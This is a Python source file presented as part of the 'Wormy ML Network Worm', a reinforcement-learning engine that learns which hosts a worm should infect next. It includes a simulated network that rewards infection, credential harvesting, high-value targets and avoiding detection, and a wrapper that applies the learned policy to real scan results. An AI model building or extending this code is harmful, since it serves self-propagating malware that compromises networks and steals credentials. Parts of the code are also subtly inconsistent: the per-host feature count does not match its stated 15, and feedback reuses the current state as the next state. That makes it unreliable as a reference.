"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
RL Engine v2.0 - Enhanced Reinforcement Learning for Network Propagation
Features:
- 15 features per host state space (was 3)
- Prioritized Experience Replay (PER)
- Gradient clipping
- Reward normalization
- Adaptive epsilon decay
- Soft target updates (tau=0.005)
- Huber loss for stability
"""

import random
import numpy as np
from collections import deque
from typing import List, Dict, Optional, Tuple


class PrioritizedReplayMemory:
    """Prioritized Experience Replay - samples important experiences more often"""
    
    def __init__(self, capacity: int = 10000, alpha: float = 0.6):
        self.capacity = capacity
        self.alpha = alpha  # How much prioritization (0 = uniform, 1 = full prioritization)
        self.memory = deque(maxlen=capacity)
        self.priorities = deque(maxlen=capacity)
    
    def push(self, experience, priority: float = 1.0):
        """Add experience with priority"""
        self.memory.append(experience)
        self.priorities.append(priority ** self.alpha)
    
    def sample(self, batch_size: int, beta: float = 0.4) -> Tuple[List, List, np.ndarray]:
        """Sample batch with importance sampling weights"""
        if len(self.memory) < batch_size:
            batch = list(self.memory)
            weights = np.ones(len(batch))
            return batch, list(range(len(batch))), weights
        
        probs = np.array(self.priorities)
        probs = probs / probs.sum()
        indices = np.random.choice(len(self.memory), batch_size, p=probs)
        
        # Importance sampling weights
        weights = (len(self.memory) * probs[indices]) ** (-beta)
        weights = weights / weights.max()
        
        batch = [self.memory[i] for i in indices]
        return batch, indices.tolist(), weights
    
    def update_priorities(self, indices: List[int], priorities: List[float]):
        """Update priorities after learning"""
        for idx, priority in zip(indices, priorities):
            if idx < len(self.priorities):
                self.priorities[idx] = (abs(priority) + 1e-6) ** self.alpha
    
    def __len__(self):
        return len(self.memory)


class PropagationAgent:
    """
    Enhanced DQN Agent for network propagation
    
    Improvements over v1:
    - Prioritized Experience Replay
    - Gradient clipping (max_norm=1.0)
    - Reward normalization
    - Huber loss instead of MSE
    - Adaptive epsilon decay
    - Soft target updates
    """
    
    def __init__(self, state_size: int, action_size: int, use_dqn: bool = True,
                 use_per: bool = True):
        self.state_size = state_size
        self.action_size = action_size
        self.use_dqn = use_dqn
        self.use_per = use_per
        
        # Replay memory
        if use_per:
            self.memory = PrioritizedReplayMemory(capacity=10000, alpha=0.6)
        else:
            self.memory = deque(maxlen=10000)
        
        # Hyperparameters
        self.gamma = 0.99  # Discount factor (increased from 0.95)
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.997  # Slower decay for more exploration
        self.learning_rate = 0.0005  # Lower learning rate for stability
        self.gradient_clip = 1.0  # Max gradient norm
        self.beta_start = 0.4  # PER beta start
        self.beta_frames = 100000  # PER beta frames to reach 1.0
        self.frame_idx = 0
        
        # Reward normalization
        self.reward_mean = 0.0
        self.reward_std = 1.0
        self.reward_count = 0
        
        self.q_network = None
        self.target_network = None
        
        self._build_model()
    
    def _build_model(self):
        """Build neural network with Huber loss and gradient clipping"""
        try:
            import tensorflow as tf
            from tensorflow import keras
            from tensorflow.keras import layers
            
            model = keras.Sequential([
                layers.Dense(128, activation='relu', input_shape=(self.state_size,)),
                layers.Dropout(0.1),
                layers.Dense(128, activation='relu'),
                layers.Dropout(0.1),
                layers.Dense(64, activation='relu'),
                layers.Dense(self.action_size, activation='linear')
            ])
            
            model.compile(
                optimizer=keras.optimizers.Adam(
                    learning_rate=self.learning_rate,
                    clipnorm=self.gradient_clip
                ),
                loss=tf.keras.losses.Huber(delta=1.0)
            )
            
            self.q_network = model
            self.target_network = keras.models.clone_model(model)
            self.target_network.build()
            self.target_network.set_weights(model.get_weights())
            
        except ImportError:
            try:
                import torch
                import torch.nn as nn
                import torch.optim as optim
                
                class DQNNetwork(nn.Module):
                    def __init__(self, state_size, action_size):
                        super().__init__()
                        self.fc = nn.Sequential(
                            nn.Linear(state_size, 128),
                            nn.ReLU(),
                            nn.Dropout(0.1),
                            nn.Linear(128, 128),
                            nn.ReLU(),
                            nn.Dropout(0.1),
                            nn.Linear(128, 64),
                            nn.ReLU(),
                            nn.Linear(64, action_size)
                        )
                    
                    def forward(self, x):
                        return self.fc(x)
                
                self.q_network = DQNNetwork(self.state_size, self.action_size)
                self.target_network = DQNNetwork(self.state_size, self.action_size)
                self.target_network.load_state_dict(self.q_network.state_dict())
                self.optimizer = optim.Adam(
                    self.q_network.parameters(), 
                    lr=self.learning_rate
                )
                self.criterion = nn.SmoothL1Loss()  # Huber loss
                self.use_torch = True
                self._torch = torch
                
            except ImportError:
                self.q_network = None
                self.target_network = None
    
    def normalize_reward(self, reward: float) -> float:
        """Normalize rewards for stable training"""
        self.reward_count += 1
        self.reward_mean += (reward - self.reward_mean) / self.reward_count
        self.reward_std += (abs(reward) - self.reward_std) / self.reward_count
        if self.reward_std < 1e-6:
            self.reward_std = 1.0
        return (reward - self.reward_mean) / max(self.reward_std, 1e-6)
    
    def act(self, state: List[float], available_actions: List[int] = None) -> int:
        """Choose action using epsilon-greedy with mask"""
        if random.random() < self.epsilon:
            if available_actions:
                return random.choice(available_actions)
            return random.randint(0, self.action_size - 1)
        
        if self.q_network is not None:
            state_array = np.array(state).reshape(1, -1)
            
            if hasattr(self, 'use_torch') and self.use_torch:
                with self._torch.no_grad():
                    q_values = self.q_network(self._torch.FloatTensor(state_array)).detach().numpy()[0]
            else:
                q_values = self.q_network.predict(state_array, verbose=0)[0]
            
            if available_actions:
                masked_q = np.full(self.action_size, float('-inf'))
                for action in available_actions:
                    masked_q[action] = q_values[action]
                return int(np.argmax(masked_q))
            
            return int(np.argmax(q_values))
        
        if available_actions:
            return random.choice(available_actions)
        
        return random.randint(0, self.action_size - 1)
    
    def remember(self, state, action, reward, next_state, done):
        """Store experience with priority"""
        priority = abs(reward) + 1.0  # Higher priority for larger rewards
        
        if self.use_per and hasattr(self.memory, 'push'):
            self.memory.push((state, action, reward, next_state, done), priority)
        else:
            self.memory.append((state, action, reward, next_state, done))
    
    def step_epsilon_decay(self):
        """Decay epsilon every step"""
        if self.epsilon > self.epsilon_min:
            self.epsilon *= self.epsilon_decay
            self.epsilon = max(self.epsilon, self.epsilon_min)
    
    def replay(self, batch_size: int = 32):
        """Train on batch with PER, gradient clipping, and reward normalization"""
        mem_len = len(self.memory)
        if mem_len < batch_size or self.q_network is None:
            return None
        
        # Get beta for importance sampling
        beta = min(1.0, self.beta_start + self.frame_idx * (1.0 - self.beta_start) / self.beta_frames)
        self.frame_idx += 1
        
        if self.use_per and hasattr(self.memory, 'sample'):
            batch, indices, weights = self.memory.sample(batch_size, beta)
        else:
            batch = random.sample(self.memory, batch_size)
            indices = list(range(batch_size))
            weights = np.ones(batch_size)
        
        states = np.array([exp[0] for exp in batch])
        next_states = np.array([exp[3] for exp in batch])
        actions = np.array([exp[1] for exp in batch])
        rewards = np.array([self.normalize_reward(exp[2]) for exp in batch])
        dones = np.array([exp[4] for exp in batch])
        
        if hasattr(self, 'use_torch') and self.use_torch:
            states_tensor = self._torch.FloatTensor(states)
            next_states_tensor = self._torch.FloatTensor(next_states)
            
            with self._torch.no_grad():
                next_q = self.target_network(next_states_tensor).detach().numpy()
            
            current_q = self.q_network(states_tensor).detach().numpy()
            
            for i in range(batch_size):
                if dones[i]:
                    current_q[i][actions[i]] = rewards[i]
                else:
                    current_q[i][actions[i]] = rewards[i] + self.gamma * np.max(next_q[i])
            
            self.optimizer.zero_grad()
            output = self.q_network(states_tensor)
            loss = self.criterion(output, self._torch.FloatTensor(current_q))
            loss.backward()
            
            # Gradient clipping
            self._torch.nn.utils.clip_grad_norm_(self.q_network.parameters(), self.gradient_clip)
            self.optimizer.step()
            
            # Update PER priorities
            if self.use_per and hasattr(self.memory, 'update_priorities'):
                td_errors = np.abs(current_q[range(batch_size), actions] - 
                                  (rewards + self.gamma * np.max(next_q, axis=1) * (1 - dones)))
                self.memory.update_priorities(indices, td_errors.tolist())
            
            return loss.item()
        else:
            current_q = self.q_network.predict(states, verbose=0)
            next_q = self.target_network.predict(next_states, verbose=0)
            
            for i in range(batch_size):
                if dones[i]:
                    current_q[i][actions[i]] = rewards[i]
                else:
                    current_q[i][actions[i]] = rewards[i] + self.gamma * np.max(next_q[i])
            
            history = self.q_network.fit(states, current_q, sample_weight=weights, 
                                        epochs=1, verbose=0)
            
            # Update PER priorities
            if self.use_per and hasattr(self.memory, 'update_priorities'):
                td_errors = np.abs(current_q[range(batch_size), actions] - 
                                  (rewards + self.gamma * np.max(next_q, axis=1) * (1 - dones)))
                self.memory.update_priorities(indices, td_errors.tolist())
            
            return history.history['loss'][0]
    
    def update_target_model(self, tau=0.005):
        """Soft update target network"""
        if self.target_network is not None and self.q_network is not None:
            if hasattr(self, 'use_torch') and self.use_torch:
                target_state = self.target_network.state_dict()
                source_state = self.q_network.state_dict()
                for key in target_state:
                    target_state[key] = tau * source_state[key] + (1 - tau) * target_state[key]
                self.target_network.load_state_dict(target_state)
            else:
                target_weights = self.target_network.get_weights()
                source_weights = self.q_network.get_weights()
                soft_weights = [
                    tau * s + (1 - tau) * t
                    for s, t in zip(source_weights, target_weights)
                ]
                self.target_network.set_weights(soft_weights)
    
    def save(self, path: str):
        """Save trained model"""
        if self.q_network is not None:
            if hasattr(self, 'use_torch') and self.use_torch:
                self._torch.save({
                    'model_state_dict': self.q_network.state_dict(),
                    'optimizer_state_dict': self.optimizer.state_dict(),
                    'epsilon': self.epsilon,
                    'reward_mean': self.reward_mean,
                    'reward_std': self.reward_std,
                }, path)
            else:
                self.q_network.save(path)
    
    def load(self, path: str):
        """Load trained model"""
        if self.q_network is not None:
            if hasattr(self, 'use_torch') and self.use_torch:
                checkpoint = self._torch.load(path)
                self.q_network.load_state_dict(checkpoint['model_state_dict'])
                self.target_network.load_state_dict(checkpoint['model_state_dict'])
                if 'optimizer_state_dict' in checkpoint:
                    self.optimizer.load_state_dict(checkpoint['optimizer_state_dict'])
                if 'epsilon' in checkpoint:
                    self.epsilon = checkpoint['epsilon']
                if 'reward_mean' in checkpoint:
                    self.reward_mean = checkpoint['reward_mean']
                if 'reward_std' in checkpoint:
                    self.reward_std = checkpoint['reward_std']
            else:
                self.q_network.load_weights(path)
                self.target_network.set_weights(self.q_network.get_weights())


class NetworkEnvironment:
    """
    Enhanced network environment with 15 features per host
    """
    
    def __init__(self, network_size: int = 20, max_steps: int = 100):
        self.network_size = network_size
        self.max_steps = max_steps
        self.current_step = 0
        
        self.hosts = []
        self.infected = []
        self.detected = False
        
        self._generate_network()
    
    def _generate_network(self):
        """Generate simulated network with realistic topology"""
        subnets = [0, 1, 2]
        for i in range(self.network_size):
            subnet = subnets[i % len(subnets)]
            host = {
                'id': i,
                'ip': f'192.168.{subnet}.{i+10}',
                'subnet': subnet,
                'vulnerability': random.randint(20, 100),
                'difficulty': random.randint(1, 10),
                'reachable': random.random() > 0.2,
                'ports': random.sample([22, 80, 443, 445, 3389, 3306, 8080], random.randint(1, 4)),
                'os': random.choice(['Windows', 'Linux', 'Linux', 'Windows']),
                'is_high_value': random.random() < 0.15,
                'credentials': random.randint(0, 5),
                'hop_distance': random.randint(1, 4),
            }
            self.hosts.append(host)
    
    def reset(self) -> np.ndarray:
        """Reset environment to initial state"""
        self.current_step = 0
        self.infected = [0]
        self.detected = False
        
        for host in self.hosts:
            host['infected'] = host['id'] == 0
        
        return self._get_state()
    
    def _get_state(self) -> np.ndarray:
        """Get enhanced state representation (15 features per host)"""
        state = []
        top_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379]
        
        for host in self.hosts:
            # Core features
            vuln = host['vulnerability'] / 100.0
            difficulty = host['difficulty'] / 10.0
            is_infected = 1.0 if host.get('infected', False) else 0.0
            port_count = len(host.get('ports', [])) / 10.0
            is_windows = 1.0 if host.get('os') == 'Windows' else 0.0
            is_linux = 1.0 if host.get('os') == 'Linux' else 0.0
            is_high_value = 1.0 if host.get('is_high_value', False) else 0.0
            credentials = host.get('credentials', 0) / 5.0
            hop_dist = host.get('hop_distance', 1) / 5.0
            subnet = host.get('subnet', 0) / 3.0
            
            # Port binary features (top 5)
            host_ports = host.get('ports', [])
            port_features = [1.0 if p in host_ports else 0.0 for p in top_ports[:5]]
            
            # Combined features
            features = [
                vuln, difficulty, is_infected, port_count, is_windows,
                is_linux, is_high_value, credentials, hop_dist, subnet,
                *port_features,
            ]
            state.extend(features)
        
        features_per_host = 15
        while len(state) < self.network_size * features_per_host:
            state.append(0.0)
        
        return np.array(state[:self.network_size * features_per_host], dtype=np.float32)
    
    def step(self, action: int) -> Tuple[np.ndarray, float, bool, Dict]:
        """Execute action with enhanced shaped reward"""
        self.current_step += 1
        
        if action >= len(self.hosts):
            return self._get_state(), -1, True, {'infected_count': len(self.infected)}
        
        target = self.hosts[action]
        
        if target.get('infected', False):
            return self._get_state(), -2, False, {'infected_count': len(self.infected)}
        
        if not target.get('reachable', True):
            return self._get_state(), -3, False, {'infected_count': len(self.infected)}
        
        success_prob = (target['vulnerability'] / 100.0) * (1 - target['difficulty'] / 20.0)
        
        if random.random() < success_prob:
            target['infected'] = True
            self.infected.append(action)
            
            # Enhanced shaped reward
            reward = 20  # Base infection reward
            
            if target.get('is_high_value', False):
                reward += 15  # High-value target bonus
            
            reward += target['vulnerability'] / 5  # Difficulty-adjusted
            reward += target.get('credentials', 0) * 3  # Per credential discovered
            reward += len(target.get('ports', []))  # Per service discovered
            
            # Detection penalty
            detection_prob = 0.05 + (target['difficulty'] / 100.0)
            if random.random() < detection_prob:
                self.detected = True
                reward -= 10
            
            # Efficiency bonus for near-complete infection
            if len(self.infected) >= self.network_size * 0.8:
                reward += 5
        else:
            reward = -5  # Failed attempt
        
        # Step penalty to encourage speed
        reward -= 0.5
        
        done = self.current_step >= self.max_steps or len(self.infected) >= self.network_size
        
        return self._get_state(), reward, done, {
            'infected_count': len(self.infected),
            'detected': self.detected,
            'high_value': target.get('is_high_value', False),
            'credentials_found': target.get('credentials', 0),
        }
    
    def get_available_actions(self) -> List[int]:
        """Get list of available (non-infected) hosts"""
        return [i for i, h in enumerate(self.hosts) if not h.get('infected', False)]


class RealWorldPropagationAgent:
    """
    Wrapper for RL agent in real-world scenarios
    """
    
    def __init__(self, agent: PropagationAgent, action_size: int):
        self.agent = agent
        self.action_size = action_size
        self.scan_results = []
        self.infected_hosts = set()
    
    def update_state(self, scan_results: List[Dict], infected_hosts: set):
        """Update agent with current network state"""
        self.scan_results = scan_results
        self.infected_hosts = infected_hosts
    
    def select_next_target(self) -> Optional[Dict]:
        """Select next target based on learned policy"""
        if not self.scan_results:
            return None
        
        available_targets = [
            t for t in self.scan_results 
            if t['ip'] not in self.infected_hosts
        ]
        
        if not available_targets:
            return None
        
        state = self._build_state(available_targets)
        action = self.agent.act(state)
        
        if action < len(available_targets):
            return available_targets[action]
        
        return max(available_targets, key=lambda x: x.get('vulnerability_score', 0))
    
    def _build_state(self, targets: List[Dict]) -> List[float]:
        """Build rich state representation from targets (15 features per host)"""
        state = []
        features_per_host = 15
        top_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379]

        for target in targets[:self.action_size]:
            vuln = target.get('vulnerability_score', 50) / 100.0
            port_count = len(target.get('open_ports', [])) / 20.0
            is_windows = 1.0 if target.get('os_guess') == 'Windows' else 0.0
            is_linux = 1.0 if target.get('os_guess') in ('Linux', 'Unix') else 0.0
            is_infected = 1.0 if target.get('ip') in self.infected_hosts else 0.0
            open_ports = target.get('open_ports', [])
            port_bits = [1.0 if p in open_ports else 0.0 for p in top_ports[:5]]
            cred_count = min(target.get('credential_count', 0) / 10.0, 1.0)
            prev_attempts = min(target.get('exploit_attempts', 0) / 5.0, 1.0)
            prev_success = target.get('exploit_success_rate', 0.5)
            strategic_value = target.get('strategic_value', 0.5)
            detection_risk = target.get('detection_risk', 0.3)
            hop_dist = min(target.get('hop_distance', 1) / 5.0, 1.0)

            host_features = [
                vuln, port_count, is_windows, is_linux, is_infected,
                *port_bits,
                cred_count, prev_attempts, prev_success,
                strategic_value, detection_risk, hop_dist,
            ]
            state.extend(host_features)

        while len(state) < self.action_size * features_per_host:
            state.append(0.0)

        return state[:self.action_size * features_per_host]

    def provide_feedback(self, target: Dict, success: bool, reward: float):
        """Provide feedback to agent for learning with correct action index"""
        if not self.scan_results:
            return

        available = [t for t in self.scan_results if t['ip'] not in self.infected_hosts]
        target_idx = None
        for i, t in enumerate(available):
            if t.get('ip') == target.get('ip'):
                target_idx = i
                break

        if target_idx is None:
            return

        state = self._build_state(available)
        next_state = self._build_state(available)
        done = False

        self.agent.remember(state, target_idx, reward, next_state, done)

        if len(self.agent.memory) >= 16:
            self.agent.replay(batch_size=16)
